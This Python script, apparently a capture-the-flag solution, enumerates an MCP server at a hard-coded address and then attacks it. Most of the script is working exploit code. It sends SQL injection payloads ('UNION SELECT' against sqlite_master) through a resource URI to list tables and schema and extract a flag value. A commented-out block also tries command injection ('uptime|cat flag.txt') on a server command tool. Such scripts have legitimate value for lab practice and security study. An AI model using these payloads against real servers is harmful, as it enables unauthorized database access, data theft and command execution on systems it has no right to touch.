import asyncio
from fastmcp import Client, FastMCP

client = Client("http://154.57.164.83:32411/mcp/")

async def main():
    async with client:
        resources = await client.list_resources()
        resource_templates = await client.list_resource_templates()
        tools = await client.list_tools()

        print("Resources:")
        for resource in resources:
            print('***')
            print(resource.name)
            print(resource.description.strip())
        print("-"*50)
        
        
        print("Resource Templates:")
        for resource_template in resource_templates:
            print('***')
            print(resource_template.uriTemplate)
            print(resource_template.description.strip())
        #try:
        #    result_object = await client.read_resource("price://asd!")
        #    print(result_object[0].text)
        #except Exception as e:
        #    print(f"[-] {e}")
        
        print("-"*50)
        print("Tools:")
        for tool in tools:
            print('***')
            params = list(tool.inputSchema.get('properties').keys())
            print(f"{tool.name}({','.join(params)})")
            print(tool.description.strip())
        print("KUKY -------")
        # Enumerar tablas
        try:
            result_object = await client.read_resource("price://x'%20UNION%20SELECT%20group_concat(name)%20FROM%20sqlite_master%20WHERE%20type='table'--")
            print("Tables:", result_object[0].text)
        except Exception as e:
            print(f"[-] Tables: {e}")

        # Enumerar columnas de una tabla específica (ajusta 'flags' si es necesario)
        try:
            result_object = await client.read_resource("price://x'%20UNION%20SELECT%20group_concat(sql)%20FROM%20sqlite_master%20WHERE%20type='table'--")
            print("Schema:", result_object[0].text)
        except Exception as e:
            print(f"[-] Schema: {e}")

        # Extraer la flag
        try:
            result_object = await client.read_resource("price://x'%20UNION%20SELECT%20flag%20FROM%20flag--")
            print("FLAG:", result_object[0].text)
        except Exception as e:
            print(f"[-] Flag: {e}")

        #try:
        #    result_object = await client.call_tool("execute_server_command", {"command": "uptime|cat flag.txt"})
        #    print(result_object)
        #    print(result_object[0].text)
        #except Exception as e:
        #    print(f"[-] {e}")

asyncio.run(main())
